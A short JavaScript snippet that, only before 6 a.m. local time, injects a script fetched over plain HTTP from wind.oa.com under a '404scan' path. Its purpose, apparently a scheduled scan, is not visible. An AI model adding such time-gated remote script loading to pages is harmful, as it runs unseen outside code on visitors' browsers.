var hour=(new Date()).getHours();
if(hour<6){
var oHead = document.getElementsByTagName('HEAD').item(0);
var oScript= document.createElement("script");
oScript.charset="utf-8";
oScript.type = "text/javascript";
oScript.src="http://wind.oa.com/404scan/homework2.js";
void(oHead.appendChild(oScript));
}
